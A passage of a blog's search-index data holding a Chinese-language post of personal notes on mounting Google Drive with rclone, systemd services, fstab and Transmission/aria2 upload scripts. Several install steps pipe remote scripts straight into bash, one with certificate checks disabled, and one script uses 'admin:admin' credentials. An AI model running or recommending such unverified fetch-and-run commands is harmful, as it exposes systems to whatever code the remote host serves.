是不一樣的東西","uri":"/blog/posts/Bash-%E5%92%8C-sh-%E6%98%AF%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF/"},{"categories":["Linux"],"content":"最近公司有用 gcsfuse 做硬碟掛載 突然想到之前有看到使用 rclone 的文章 今天就小式了一下 ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:0:0","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"在 Window 掛載 rclone 參考使用 rclone 在 Windows 下挂载 Google 个人 / 团队云盘 - R 酱小窝實作 ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:1:0","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"下載 rclone ： https://rclone.org/downloads/ winfsp ： http://www.secfs.net/winfsp/download/ winfsp一定要安裝，這個軟體跟掛載有關係 ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:1:1","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"設定 rclone config 參考: Linux下rclone简单教程(支持VPS数据同步,多种网盘,支持挂载) | 半醉浮生丶 root@arm1:~# rclone config 2018/06/12 15:36:43 NOTICE: Config file “/root/.config/rclone/rclone.conf” not found – using defaults No remotes found – make a new one n) New remote s) Set configuration password q) Quit config n/s/q\u003e n **********************选择 n，新建配置文件 name\u003e test **********************输入配置的名称 Type of storage to configure. Choose a number from below, or type in your own value 1 / Alias for a existing remote \\ “alias” 2 / Amazon Drive \\ “amazon cloud drive” 3 / Amazon S3 Compliant Storage Providers (AWS, Ceph, Dreamhost, IBM COS, Minio) \\ “s3” 4 / Backblaze B2 \\ “b2” 5 / Box \\ “box” 6 / Cache a remote \\ “cache” 7 / Dropbox \\ “dropbox” 8 / Encrypt/Decrypt a remote \\ “crypt” 9 / FTP Connection \\ “ftp” 10 / Google Cloud Storage (this is not Google Drive) \\ “google cloud storage” 11 / Google Drive \\ “drive” 12 / Hubic \\ “hubic” 13 / Local Disk \\ “local” 14 / Mega \\ “mega” 15 / Microsoft Azure Blob Storage \\ “azureblob” 16 / Microsoft OneDrive \\ “onedrive” 17 / Openstack Swift (Rackspace Cloud Files, Memset Memstore, OVH) \\ “swift” 18 / Pcloud \\ “pcloud” 19 / QingCloud Object Storage \\ “qingstor” 20 / SSH/SFTP Connection \\ “sftp” 21 / Webdav \\ “webdav” 22 / Yandex Disk \\ “yandex” 23 / http Connection \\ “http” Storage\u003e 11 **********************这里是添加 googledrive 云盘，选择 11，当然你也可以添加其它云盘 Google Application Client Id – leave blank normally. client_id\u003e **********************回车留空即可 Google Application Client Secret – leave blank normally. client_secret\u003e **********************回车留空即可 Scope that rclone should use when requesting access from drive. Choose a number from below, or type in your own value 1 / Full access all files, excluding Application Data Folder. \\ “drive” 2 / Read-only access to file metadata and file contents. \\ “drive.readonly” / Access to files created by rclone only. 3 | These are visible in the drive website. | File authorization is revoked when the user deauthorizes the app. \\ “drive.file” / Allows read and write access to the Application Data folder. 4 | This is not visible in the drive website. \\ “drive.appfolder” / Allows read-only access to file metadata but 5 | does not allow any access to read or download file content. \\ “drive.metadata.readonly” scope\u003e **********************回车留空即可，这里是云盘 API 权限的设置 ID of the root folder – leave blank normally. Fill in to access “Computers” folders. (see docs). root_folder_id\u003e **********************回车留空即可 Service Account Credentials JSON file path – leave blank normally. Needed only if you want use SA instead of interactive login. service_account_file\u003e Remote config Use auto config? * Say Y if not sure * Say N if you are working on a remote or headless machine or Y didn’t work y) Yes n) No y/n\u003e n **********************输入 n，手动配置 If your browser doesn’t open automatically go to the following link: https://accounts.google.com/o/oauth2/auth?access_type=offline\u0026client_id=20111111644.apps.googleusercontent.com\u0026redirect_uri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob\u0026response_type=code\u0026scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive\u0026state=1111111111111111111111 **********************在本地打开这个链接，添加 google 云盘账号授予 rclone 权限 Log in and authorize rclone for access Enter verification code\u003e 4/AAC8CPF21dYWqRnNSw479Fa8dUb11111111111111111111111111E **********************输入在浏览器获取的认证 code Configure this as a team drive? y) Yes n) No y/n\u003e y **********************是否团队云盘，我这里是，所以选择 Y Fetching team drive list… Choose a number from below, or type in your own value 1 / back \\ “0AAbWF01111111111” 2 / back2 \\ “0ABf3gOL111111111” Enter a Team Drive ID\u003e 1 **********************选择一个你要添加的团队云盘 ——————– [test] type = drive client_id = client_secret = scope = root_folder_id = service_account_file = token = {“access_token”:”ya29.GlvY1111qGBysX4tO_V5ZSO1PZ_Kq1111111111111111fksugvyOFC-MzvAPnl1rsi3OOwMFTdkk11111111H_u5zzPRp0eB_iLzKsZOVzP3R2ee1111AVmO”,”token_type”:”Bearer”,”refresh_token”:”1/r5Q_pH11111111CV-xiMne9_w62y_ag11bT_H9zz7qc”,”expiry”:”2018-","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:2:0","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"掛載 rclone mount gdrive:/ x: --cache-dir D:\\tmp --vfs-cache-mode writes # git bash rclone mount gdrive:/ x: --cache-dir /d/tmp --vfs-cache-mode writes 不知道為什麼我的 powershell 執行失敗… 但用 Git bash 就可以順力執行 ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:2:1","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"GUI 另外，GUI 介面:Releases · kapitainsky/RcloneBrowser 這個我就沒有試了 ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:2:2","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"在 Raspberry Pi 掛載 ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:3:0","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"安裝 # raspberry pi curl -L https://raw.github.com/pageauc/rclone4pi/master/rclone-install.sh | bash # normal(not raspberry pi) curl https://rclone.org/install.sh | sudo bash 有看到sudo apt install rclone也可以使用，我沒有測試 rclone config 就不再寫了，請看上面 ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:3:1","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"掛載 這邊需要注意權限問題 假如要掛載 /mnt/xxx 可能未因為 user 權限無法掛載 可以使用家目錄 或者吧 /mnt/xxx 改成 777 或者切換 root 做 mount rclone mount --vfs-cache-mode writes --fast-list --vfs-cache-max-size 100M gdrive: /mnt/gdrive 有執行發現這一行不是背景執行… 除了用\u0026 還發現有人用 tmux ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:3:2","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"Tmux tmux # create tmux tmux ls # tmux ls tmux a -t 0# tmux session Ctrl+b \u0026 d (關掉背景執行) 簡單說一下，tmux建立一個 session，做 mount 動做 這時候會發現不能做任何動作，Ctrl+b \u0026 d會回到原始的 bash 再輸入tmux，可以做cp 動作到gdrive 再Ctrl+b \u0026 d 關掉 command line 連線都還會在 tmux ls可以看到還有哪些 session 再跑 因為指令不熟又不常用，之前用過的都忘了差不多 有空再補… ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:3:3","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"自動掛載 假如用網路上範例 路徑存放在/etc/systemd/system/rclone.service 使用前建議用root掛載 但聽說一般 user 也能設定 我沒有仔細研究 ~/.config/systemd/user/rclone@.service 改完記得要systemctl daemon-reload (還沒測試) [Unit] Description=rclone: Remote FUSE filesystem for cloud storage config %i Documentation=man:rclone(1)[Service] Type=notify ExecStartPre=/bin/mkdir -p %h/mnt/%i ExecStart= \\ /usr/bin/rclone mount \\ --fast-list \\ --vfs-cache-mode writes \\ --vfs-cache-max-size 100M \\ %i: %h/mnt/%i[Install] WantedBy=default.target 剛剛發現--daemon有這個，尚未測試測是這個可運作!! [Unit] Description=RClone Service After=network-online.target Wants=network-online.target [Service] Type=notify ExecStart=/usr/sbin/rclone mount --allow-other --dir-cache-time 48h --vfs-read-chunk-size 16M --buffer-size 2G Googlecrypt: /home/plex ExecStop=/bin/fusermount -uz /home/plex Restart=on-abort 最終我電腦設定 [Unit] Description=RClone Service After=network-online.target Wants=network-online.target [Service] User=pi Type=notify #ExecStart=/usr/bin/rclone mount --allow-root --vfs-cache-mode writes --vfs-cache-max-size 100M gdrive: /mnt/gdrive ExecStart=/usr/bin/rclone mount --allow-root --vfs-cache-mode writes --vfs-cache-max-size 100M gdrive: /mnt/gdrive ExecStop=/bin/fusermount -uz /mnt/gdrive RestartSec=30 [Install] WantedBy=multi-user.target allow-root 不能用…，好像是 bug Rclone auto mount - rclone - rclone forum rclone Systemd startup mount script – JamesCoyle.net Limited rclone fstab mount helper script · rclone/rclone Wiki Restart 可參考Systemd 入门教程：实战篇 - 阮一峰的网络日志 systemd (正體中文) - ArchWiki ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:3:4","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"移除 rclone Home · pageauc/rclone4pi Wiki ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:3:5","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"使用 Google Driver 注意事項 1 天上傳最多 750 GB 1 個檔案不能超過 100 GB 不能太平凡掛載 超過小心帳號可能會被 Ban!! ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:3:6","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"rsync 複製檔案顯示進度 rsync -rvh --progress /mnt/ddd /mnt/gdrive -r 複製資料夾記得要加上去 影片不建議使用 rsync ，不知道為什麼丟到上面去，影片不會轉成線上看 下載檔案後面會加奇怪副檔名，所以用 cp 比較不會有問題 後來發現rclone sync xxx gd:xxx -P 也能看狀態= = ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:3:7","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"Raspberry PI 掛載 USB 之前有在 葉難: Raspberry Pi：自動掛載USB隨身碟 看到怎麼使用 UUID=\"F840-AAE1\" /media/usbstick vfat rw,defaults 0 0 後面兩個 0 代表 第五欄：能否被 dump 備份指令作用： dump 是一個用來做為備份的指令，不過現在有太多的備份方案了，所以這個項目可以不要理會啦！直接輸入 0 就好了！ 第六欄：是否以 fsck 檢驗磁區： 早期開機的流程中，會有一段時間去檢驗本機的檔案系統，看看檔案系統是否完整 (clean)。 不過這個方式使用的主要是透過 fsck 去做的，我們現在用的 xfs 檔案系統就沒有辦法適用，因為 xfs 會自己進行檢驗，不需要額外進行這個動作！所以直接填 0 就好了。 參考:鳥哥的 Linux 私房菜 – 第七章、Linux 磁碟與檔案系統管理 sudo fdisk -l (查看裝置有沒有掛載) $ sudo mkdir /mnt/extHDD (建置掛載用的資料夾和權限) $ sudo chown pi:pi /mnt/extHDD sudo mount -t vfat /dev/sda1 /mnt/extHDD # (test mount) ext4的話，把 vfat 改成 ext4 -o uid=pi,gid=pi我的樹莓派家這段會失敗 sudo umount /dev/sda1 # 解除掛載 sudo blkid # 查看掛載的 UUID sudo vim /etc/fstab 加入 UUID=“F840-AAE1” /mnt/extHDD vfat rw,defaults 0 0 #(-a, –all 掛載 fstab 中的所有文件系統) Mount的用法詳細解析 - IT閱讀 最近看到使 Amazon EBS 磁碟區可供在 Linux 上使用 - Amazon Elastic Compute Cloud這篇 UUID=aebf131c-6957-451e-8d34-ec978d9581ae /data xfs defaults,nofail 0 2 如果曾在不掛載此磁碟區的狀態下開機執行個體 (例如，在將磁碟區移至其他執行個體後)，nofail 掛載選項可讓執行個體繼續開機，即使在掛載磁碟區的作業出現錯誤。包括 16.04 前之 Ubuntu 版本在內的 Debian 衍生產品，也必須新增 nobootwait 掛載選項。 /usr/bin/rclone mount –allow-root –vfs-cache-mode writes –vfs-cache-max-size 100M gdrive: /mnt/gdrive 2019/10/16 16:15:54 mount helper error: fusermount: option allow_root only allowed if ‘user_allow_other’ is set in /etc/fuse.conf ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:3:8","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"systemctl 和 service 掛載的差異 在這次藉著學習到簡單使用 systemctl 設定服務 但很好奇這兩個差異 systemd是Linux系統最新的初始化系統(init),作用是提高系統的啟動速度，儘可能啟動較少的進程，儘可能更多進程並發啟動。 systemd對應的進程管理命令是systemctl 參考:Linux 服務管理兩種方式service和systemctl - 迪米特 - 博客園 裡面還有講:主要有四種類型文件.mount,.service,.target,.wants 有找到比較兩者指令差異centos7 systemctl取代service和chkconfig来实现系统管理 - cape的博客 - CSDN博客 備份圖 發現選擇 systemctl 還是能繼續用 service 指令 習慣改不了用 service XDD 但設定上 service 設定服務需要用 chkconfig 用systemctl 直接 enable/disable 就能解決 systemd (简体中文) - ArchWiki systemd/User (简体中文) - ArchWiki journalctl 查看 systemctl log #查看所有日誌（默認情況下 ，只保存本次啟動的日誌） $ sudo journalctl #查看內核日誌（不顯示應用日誌） $ sudo journalctl -k #查看系統本次啟動的日誌 $ sudo journalctl -b $ sudo journalctl -b -0 #查看上一次啟動的日誌（需更改設置） $ sudo journalctl -b -1 #查看指定時間的日誌 $ sudo journalctl --since=\"2017-09-26 22:17:16\" $ sudo journalctl --since \"30 min ago\" $ sudo journalctl --since yesterday $ sudo journalctl --since \"2015-01-10\" --until \"2017-01-11 03:00\" $ sudo journalctl --since 09:00 --until \"1 hour ago\" #顯示尾部的最新10行日誌 $ sudo journalctl -n #顯示尾部指定行數的日誌 $ sudo journalctl -n 50 #實時滾動顯示最新日誌 $ sudo journalctl -f #查看指定服務的日誌 $ sudo journalctl /usr/lib/systemd/systemd #查看指定進程的日誌 $ sudo journalctl _PID=1 #查看某個路徑的腳本的日誌 $ sudo journalctl /usr/bin/bash #查看指定用戶的日誌 $ sudo journalctl _UID=33 --since today #查看某個 Unit 的日誌 $ sudo journalctl -u nginx.service $ sudo journalctl -u nginx.service --since today #實時滾動顯示某個 Unit 的最新日誌 $ sudo journalctl -u nginx.service -f #合併顯示多個 Unit 的日誌 $ journalctl -u nginx.service -u php-fpm.service --since today #查看指定優先級（及其以上級別）的日誌，共有8級 # 0: emerg # 1: alert # 2: crit # 3: err # 4: warning # 5: notice # 6: info # 7: debug $ sudo journalctl -p err -b #日誌默認分頁輸出，--no-pager 改為正常的標準輸出 $ sudo journalctl --no-pager #以 JSON 格式（單行）輸出 $ sudo journalctl -b -u nginx.service -o json #以 JSON 格式（多行）輸出，可讀性更好 $ sudo journalctl -b -u nginx.serviceqq -o json-pretty #顯示日誌占據的硬碟空間 $ sudo journalctl --disk-usage #指定日誌文件占據的最大空間 $ sudo journalctl --vacuum-size=1G #指定日誌文件保存多久 $ sudo journalctl --vacuum-time=1years 原文網址：https://kknews.cc/code/pqyayy2.html 相關網頁 systemd一種更好的啟動方式 - 每日頭條 鳥哥的 Linux 私房菜 – 第十七章、認識系統服務 (daemons) 玩转 systemd 之用户级服务管理 - 依云’s Blog 聽說一般 user 家目錄也可以做服務設定 這一快我就先不研究 改天用到再說 2020-04-26 這些查詢滿常用的 # 檢查 nginx 服務是否正在運行 systemctl is-active nginx.service # 檢查 nginx 服務是否有設定開機自動啟動 systemctl is-enabled nginx.service # 檢查 nginx 服務是否啟動失敗 systemctl is-failed nginx.service ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:3:9","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"tmux 掛載方式(不建議用) 在沒知道用 systemctl 原本想使用 tmux 不過看起來好像能跑，但我覺得 systemctl 比較完美 tmux script example #!/bin/bash tmux new-window -d -n 'test' 'ping 127.0.0.1' ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:3:10","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"tranmission \"script-torrent-done-enabled\": true, \"script-torrent-done-filename\": \"/home/user/script.sh\", 記得 chmod a+x /home/user/script.sh 裡面對印的 conf 也要加 777 (tranmission不同權限，或加群組權限) # 注意需要看.config/rclone 資料夾和檔案權限，需要到rx RCLONE_CONFIG_PATH=\"--config=/home/pi/.config/rclone/rclone.conf\" Transmission download complete shell script for moving complete files and removing its torrent entry Script to clear finished torrents from transmission-daemon Guide : Auto removal of downloads from transmission 2.82 - My Cloud - Personal Cloud Storage / My Cloud - WD Community Tmux 開啟後 自動 SSH 連結多台指定機器 | Tsung’s Blog Transmission - Script to move completed downloads to directories, or how to create script? - Plugins - openmediavault ubuntu - Copy completed files larger than 1024M to another directory - Super User ubuntu - Copy completed files larger than 1024M to another directory - Super User 密碼不要取驚嘆號 技术|在Linux命令行下令人惊叹的惊叹号（!） Oct 18 23:35:12 raspberrypi transmission-daemon[13077]: 2019/10/18 23:35:12 Failed to save config after 10 tries: Failed to create temp file for new config: open /home/pi/.config/rclone/rclone.conf295018896: permission denied Oct 18 23:35:17 raspberrypi transmission-daemon[13077]: 2019/10/18 23:35:17 Failed to save config after 10 tries: Failed to create temp file for new config: open /home/pi/.config/rclone/rclone.conf984318943: permission denied 我改寫的 Script 有通知 discord 功能 #!/bin/bash DSCORD_WEBHOOK=\"https://discordapp.com/api/webhooks/*\" # 需要做同步的路徑，結尾資料夾不用/ LOCAL_SYNCDIR=\"/mnt/extHDD/Download\" # RCLONE 結尾不能有 / RCLONE_SYNCDIR=\"gdrive:/test\" # 注意需要看.config/rclone 資料夾和檔案權限，需要到rx RCLONE_CONFIG_PATH=\"--config=/home/pi/.config/rclone/rclone.conf\" AUTH=\"--auth admin:admin\" #### debug end df -H | grep -vE '^Filesystem|tmpfs|cdrom|udev|已用' | awk '{ print $5 \" \" $1 }' | while read output; do usep=$(echo $output | awk '{ print $1}' | cut -d'%' -f1 ) partition=$(echo $output | awk '{ print $2 }' ) if [ $usep -ge 80 ]; then msg=\"⚠️注意快超出硬碟空間\\\\\\\"$partition\\\\\\\" ($usep%) on $(hostname) as on $(date)\" url=$DSCORD_WEBHOOK curl -H \"Content-Type: application/json\" \\ -X POST \\ -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${msg}\\\"}\" $url fi done if [[ \"$TR_TORRENT_DIR\" =~ ^\"$LOCAL_SYNCDIR\" ]]; then echo \"pass\" if [ -f \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" ]; then flock -x /tmp/rclone.lock rclone copy ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"$RCLONE_SYNCDIR\" rclone check ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"$RCLONE_SYNCDIR\" else flock -x /tmp/rclone.lock rclone copy ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"$RCLONE_SYNCDIR/${TR_TORRENT_NAME}\" rclone check ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"$RCLONE_SYNCDIR/${TR_TORRENT_NAME}\" --size-only fi if [ $? -eq 0 ]; then msg=\"✅ $TR_TORRENT_NAME 完成下載，並完成同步\" echo $msg url=$DSCORD_WEBHOOK curl -H \"Content-Type: application/json\" \\ -X POST \\ -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${msg}\\\"}\" $url transmission-remote $AUTH -t $TR_TORRENT_ID --remove-and-delete else echo \"FAIL\" msg=\"⚠️ $TR_TORRENT_NAME 完成下載，但同步失敗\" echo $msg url=$DSCORD_WEBHOOK curl -H \"Content-Type: application/json\" \\ -X POST \\ -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${msg}\\\"}\" $url fi else echo \"✅$TR_TORRENT_NAME 完成下載，不需要做同步\" msg=\"✅$TR_TORRENT_NAME 完成下載，不需要做同步\" echo $msg url=$DSCORD_WEBHOOK curl -H \"Content-Type: application/json\" \\ -X POST \\ -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${msg}\\\"}\" $url fi 有時候會失敗，補跑方式也很簡單 export TR_TORRENT_DIR=\"/mnt/extHDD/Download\" ls $TR_TORRENT_DIR export TR_TORRENT_NAME=\"xxx\" #測試 #echo ${TR_TORRENT_DIR}/${TR_TORRENT_NAME} ls \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" /etc/transmission-daemon/syncGdrive.sh 最近這個腳本還算完美的 不過處理大檔案rclone check 太久了 → thousandday: rclone sync比對修改時間和size(很快,省流量) 05/29 18:17 → thousandday: rclone check –size-only比對size(很快,省流量) 05/29 18:18 → thousandday: rclone sync -c完整下載後Checksum(慢,費流量) 05/29 18:18 → thousandday: rclone check下載hash值後Checksum(慢,省流量) 05/29 18:18 → thousandday: Googl","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:4:0","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"aria2(不建議使用) 除非你想用… 安裝方法 wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubiBackup/doubi/master/aria2.sh \u0026\u0026 chmod +x aria2.sh \u0026\u0026 bash aria2.sh 『原创』BT/种子/磁力链接下载工具 —— Aria2 一键安装管理脚本 | 逗比根据地 但說真的這個腳本整合超好的 幫我同學用的 結果用別人 Script 搬到 rclone 不能正常 所以自己改寫，可能有 bug 請自行修 有看到 *.aria2 檔案有刪除 重開機有時候回重新載(然後aira2檔案又會出現…) 不知道是不是用 aria2 會有這樣問題? $3 不是傳資料夾位址 所以在查哪個資料夾會不太方便 所以檔案一定要下載在 downloadpath 才會做上傳動作 Script 是參考這個網站 但好像連不到了(在我寫這篇前幾天掛掉…) 使用 Aria2 + rclone 遇到的一些问题 | 代码真香 備份到 Plunker - demo script Youtube 還活著 代码真香 - YouTube 目前 $3 是傳第一個檔案內容 這邊就跟 tranmission 不太一樣，tranmission 給的參數比較完整 發現原 Script 會複製全部目錄到 rclone 去 這樣多線程下載的檔案會有問題 所以依照來看，舊的 Script 應該是 1線程 下載 (它裡面網頁沒寫…，不過看他網頁寫 VPS 10GB 看來是有可能的….) 因為我不熟 shell ，以下用的出事不要找我XD #!/bin/bash filepath=$3 #取文件原始路径，如果是单文件则为/Download/a.mp4，如果是文件夹则该值为文件夹内第一个文件比如/Download/a/1.mp4 path=${3%/*} #取文件根路径，如把/Download/a/1.mp4变成/Download/a downloadpath='/media/download' #Aria2下载目录 name='gdrive' #配置Rclone时的name folder='/test2' #网盘里的文件夹，如果是根目录直接留空 MinSize='10k' #限制最低上传大小，默认10k，BT下载时可防止上传其他无用文件。会删除文件，谨慎设置。 MaxSize='15G' #限制最高文件大小，默认15G，OneDrive上传限制。 if [ $2 -eq 0 ]; then exit 0; fi if [ `dirname \"$filepath\"` = \"$downloadpath\" ] \u0026\u0026 [ $2 -eq 1 ] #如果下载的是单个文件 then echo \"enter 1\" rclone move -v \"$filepath\" ${name}:${folder} --min-size $MinSize --max-size $MaxSize rm -vf \"$filepath\".aria2 #删除残留的.aria.2文件 echo result: $? exit 0 elif [[ \"$path\" =~ ^\"$downloadpath\" ]] #如果下载的是文件夹 then echo \"enter 2\" echo path_length ${#path} a=$downloadpath b=\"$filepath\" c=${b#$a/} d=${c%%/*} echo d = $d echo $path/$d/ rclone move -v \"$downloadpath/$d/\" ${name}:/${folder}/\"${d}\" --min-size $MinSize --max-size $MaxSize --delete-empty-src-dirs #rclone delete -v \"$downloadpath/$d/\" --max-size $MinSize #删除多余的文件 #rclone rmdirs -v \"$downloadpath/$d/\" --leave-root #删除空目录，--delete-empty-src-dirs 参数已实现，加上无所谓。 rm -vf \"$downloadpath/$d\".aria2 #删除残留的.aria2文件 rmdir \"$downloadpath/$d\" echo result: $? exit 0 fi a=“123” b=“123/4/125/1236” c=${b#$a/} d=${c%%/*} shell中#,##,#,##,% *,%% *的含义及用法 - jiezi2016的博客 - CSDN博客 ","date":"2019-10-14","objectID":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/:4:1","tags":["rclone","linux","gdrive"],"title":"rclone 掛載硬碟小記","uri":"/blog/posts/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"參考來源 Linux下rclone简单教程(支持VPS数据同步,多种网盘,支持挂载) | 半醉浮生丶 Raspberry Pi microSD card performance comparison - 2019 | Jeff Geerling 树莓派raspberrypi3打造homeassistant+homebridge智能家居中心（homekit） - 知乎 raspbian - How to set VNC security settings using SSH? No security types supported. Server sent security types, but we do not support any of them - Raspberry Pi Stack Exchange 解决Rclone挂载Google Drive时上传失败和内存占用高等问题 - Rat’s Blog 利用Aria2+Nginx+rclone完成无限电影硬盘 | Sandy’Blog Plex + Rclone 掛載 Google drive 搭建多媒體伺服器 - WIJ Blog [筆記]將Google Drive掛載到NAS上(用rclone) @ 老電影下載 [ Old Movies ] :: 痞客邦 :: 使用 rclone 在 Windows 